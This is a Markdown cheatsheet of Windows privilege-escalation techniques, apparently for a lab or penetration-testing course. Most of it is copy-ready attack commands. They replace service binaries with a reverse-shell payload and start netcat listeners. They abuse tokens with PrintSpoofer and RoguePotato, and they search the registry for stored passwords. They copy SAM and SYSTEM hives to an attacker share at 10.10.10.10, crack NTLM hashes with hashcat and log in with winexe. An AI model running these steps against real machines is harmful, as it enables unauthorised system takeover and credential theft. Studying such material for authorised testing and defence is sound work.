# Windows Privilege Escalation Cheatsheet

This is a comprehensive cheatsheet for privilege escalation techniques on Windows, detailing common attack vectors and exploitation methods.

## 0 INITIAL ENUMERATION - ESSENTIAL
────────────────────────────────────────────
- `whoami`
- `hostname`
- `systeminfo`
- `whoami /priv`
- `whoami /groups`
- `net user`
- `net localgroup administrators`
- `tasklist`
- `netstat -ano`
- `wmic logicaldisk get caption,description,providername`
- `dir /s /b c:\*.txt`
- `icacls C:\path`


## 1 WEAK SERVICE PERMISSIONS  
────────────────────────────────────────────  
### To find services with weak permissions:

`sc qc <service>`

### Check binPath and permissions. If modifiable, use:

`sc config <service> binpath= "C:\PrivEsc\reverse.exe"  `
`net start <service>  `

### Example - daclsvc Service:  
Check permissions of the service:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

### Verify the service configuration:
`sc qc daclsvc`

### Modify the binPath:
`sc config daclsvc binpath= ""C:\PrivEsc\reverse.exe""` 

### Start the service:
`net start daclsvc`


## 2 UNQUOTED SERVICE PATH 
────────────────────────────────────────────

### Steps to exploit unquoted service paths:
### Verify the service configuration:
`sc qc unquotedsvc`

### Check write permissions on the service directory:
`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

### Copy and rename the payload:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

### Start the listener on Kali:
`nc -lvnp 4444`

### Start the vulnerable service:
`net start unquotedsvc`


## 3 SERVICE EXECUTABLE REPLACEMENT 
────────────────────────────────────────────

### Exploit Steps:
### Verify the service configuration:
`sc qc filepermsvc`

### Check write permissions:
`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

### Replace the executable:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

### Start the listener:
`nc -lvnp 4444`

### Start the service:
`net start filepermsvc`


## 4 DLL HIJACKING
────────────────────────────────────────────

### Exploit Steps:
Use Procmon to monitor processes for missing DLLs.

Create a custom DLL that triggers a reverse shell.

Inject the DLL into the correct directory.

Run the vulnerable program, which loads your DLL and triggers the reverse shell.


## 5 TOKEN IMPERSONATION (SeImpersonatePrivilege) 
────────────────────────────────────────────

### Exploit with PrintSpoofer:
`C:\PrivEsc\PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"`

### Exploit with RoguePotato:
`sudo socat tcp-listen:135,reuseaddr,fork tcp:<IP-WINDOWS>:9999`
`C:\PrivEsc\RoguePotato.exe -r <IP-KALI> -e "C:\PrivEsc\reverse.exe" -l 9999`


## 6 PATH HIJACKING
────────────────────────────────────────────

### Exploit Steps:
### Verify the service binPath:
`sc qc <service>`

### Create a payload with the same name as the service executable.

### Modify the PATH environment variable:
`set PATH=C:\path_to_your_directory;%PATH%`

### Start the service:
`net start <service>`


## 7 STARTUP FOLDER ABUSE
────────────────────────────────────────────

### Create a .lnk or .exe file with a reverse shell.

### Save it in one of the following folders:
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`  
`C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

### Upon login, the file will execute automatically, providing shell access.


## 8 TASK SCHEDULER 
────────────────────────────────────────────

### List scheduled tasks:
`schtasks /query /fo LIST /v`

Modify a vulnerable task to run a reverse shell.


## 9 FILE/REGISTRY PERMISSION ABUSE
────────────────────────────────────────────

### Verify file permissions:
`icacls C:\path\to\file`

### Verify registry permissions:
`reg query "HKCU\Software\MyApp"`

Inject a reverse shell into writable files/registry entries.


## 10 UAC BYPASS 
────────────────────────────────────────────

Use `fodhelper.exe` or `eventvwr.exe` to bypass UAC and gain elevated privileges if you are in the Administrators group.


## 11 SERVICE ACCOUNT ABUSE
────────────────────────────────────────────

### Use PSExec64 to execute a reverse shell as "Local Service":
`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`


## 12 ABUSE OF AUTORUN VIA REGISTRY
────────────────────────────────────────────

### Query the AutoRun programs:
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Replace an AutoRun program with a reverse shell.


## 13 RECOVERING AUTOLOGON CREDENTIALS AND ACCESS WITH WINEXE 
────────────────────────────────────────────

### Query for credentials stored in the registry:
`reg query HKLM /f password /t REG_SZ /s`

### Use winexe to access the machine:
`winexe -U 'admin%password123' //MACHINE_IP cmd.exe`


## 14 NTLM PASSWORD EXTRACTION AND CRACKING 
────────────────────────────────────────────

### Copy the SAM and SYSTEM files from the Windows machine to Kali:
`copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`
`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`

### Use creddump7 to extract password hashes:
`git clone https://github.com/Tib3rius/creddump7`
`pip3 install pycrypto`
`python3 creddump7/pwdump.py SYSTEM SAM`

### Crack the NTLM hash using hashcat:
`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

Use winexe or RDP to log in with the cracked password.


## 15 PAINT PRIVILEGE ESCALATION
────────────────────────────────────────────

Open Paint and verify if it runs with elevated privileges.

Use the file dialog in Paint to execute cmd.exe and gain a shell.


## 16 PRIVILEGE ESCALATION VIA AUTORUN FOLDER
────────────────────────────────────────────

### Check write permissions to the Startup folder:
`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
`Create a shortcut to your payload in the Startup folder.`


## 17ESCALATION USING SOCAT, PSExec64, AND ROGUEPOTATO
────────────────────────────────────────────

### Use socat to set up port forwarding from Kali to Windows:
`sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999`

### Execute PSExec64 and RoguePotato for privilege escalation:
`C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`


## 18 PRIVILEGE ESCALATION WITH PSExec64 AND PrintSpoofer
────────────────────────────────────────────

Use PSExec64 to execute the reverse shell as "local service."

Use PrintSpoofer to escalate privileges to SYSTEM.


## Additional Notes:
If you are in a "local service" or "network service" shell, use PrintSpoofer or RoguePotato to escalate to SYSTEM privileges.

